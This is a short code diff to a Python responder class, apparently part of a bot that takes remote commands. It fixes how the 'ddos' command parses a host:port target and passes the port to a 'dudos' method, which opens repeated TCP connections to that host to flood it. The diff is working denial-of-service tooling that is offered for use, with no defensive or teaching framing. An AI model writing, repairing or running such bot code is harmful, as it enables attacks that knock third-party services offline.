@@ -27,9 +27,8 @@ class Toast(BaseResponder):
 			if cmd == 'ddos' and params:
 				self.respond(msg, command + ' ok')
 				print(params)
-				host, port = params.split(':')
-				print(host, ':::::::', port)
-				self.dudos(sock=msg, host=host)
+				host, port = params[0].split(':')
+				self.dudos(sock=msg, host=host, port=int(port))
 			elif cmd == 'quit':
 				self.respond(msg, command + ' ok')
 				self.respond(msg, 'Bye!')
@@ -43,7 +42,7 @@ class Toast(BaseResponder):
 		for _ in range(times):
 			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			try:
-				sock.connect((host, int(port)))
+				sock.connect((host, port))
 				sock.send(b'hello')
 				sock.close()
 			except Exception as e:
